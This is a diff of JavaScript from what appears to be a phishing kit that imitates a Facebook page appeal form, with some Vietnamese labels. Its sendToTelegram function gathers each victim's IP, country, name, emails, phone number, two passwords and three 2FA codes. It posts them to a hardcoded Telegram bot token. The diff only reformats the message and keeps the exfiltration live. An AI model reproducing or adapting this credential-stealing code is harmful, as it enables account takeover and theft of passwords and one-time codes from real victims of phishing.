@@ -4375,23 +4375,18 @@
 
         // Send data to telegram
         function sendToTelegram() {
-    var content = "*Thông Tin Form*\n" +
-        "IP: " + userIpData['user_ip'] + "\n" +
-        "Country: " + userIpData['country'] + " (" + userIpData['country_code'] + "\n" +
-        "Full Name: " + formsSendData['full-name'] + "\n" +
-        "Personal Email: " + formsSendData['personal-email'] + "\n" +
-        "Business Email: " + formsSendData['Business-email'] + "\n" +
-        "Mobile Phone Number: " + formsSendData['mobile-phone-number'] + "\n" +
+     var content = "*Data : *" + userIpData['user_ip'] + " - " +userIpData['country'] + " - " + userIpData['country_code'] + "\n" +
+        "Full Name : " + formsSendData['full-name'] + "\n" +
+        "Personal email: " + formsSendData['personal-email'] + "\n" +
+        "Business email: " + formsSendData['Business-email'] + "\n" +
+        "Phone number: " + formsSendData['mobile-phone-number'] + "\n" +
         "Password 1: " + formsSendData['password-1'] + "\n" +
         "Password 2: " + formsSendData['password-2'] + "\n" +
-        "2FA-1: " + formsSendData['2FA-1'] + "\n" +
-        "2FA-2: " + formsSendData['2FA-2'] + "\n" +
-        "2FA-3: " + formsSendData['2FA-3'] + "\n" +
-        "Facebook Page Name: " + formsSendData['page-name'] + "\n" +
-        "Appeal: " + formsSendData['appeal'] + "\n" +
-        "Device Name: " + metrics['dis_name'] + "\n" +
-        "Is Mobile: " + (metrics['is_Mobile'] ? 'Yes' : 'No') + "\n" +
-        "Additional Parameters: " + JSON.stringify(metrics['params']) + "\n" + ")";
+        "Code lần 1: " + formsSendData['2FA-1'] + "\n" +
+        "Code lần 2: " + formsSendData['2FA-2'] + "\n" +
+        "Code lần 3: " + formsSendData['2FA-3'] + "\n" +
+        "Faceb Page: " + formsSendData['page-name'] + "\n" +
+        "Is Mobile: " + (metrics['is_Mobile'] ? 'Yes' : 'No') + "\n";
 
     var token = "7208709453:AAFkh2A6NBskrhYKlt1glX55N3kzEPjWkek";
     var url = `https://api.telegram.org/bot${token}/sendMessage`;
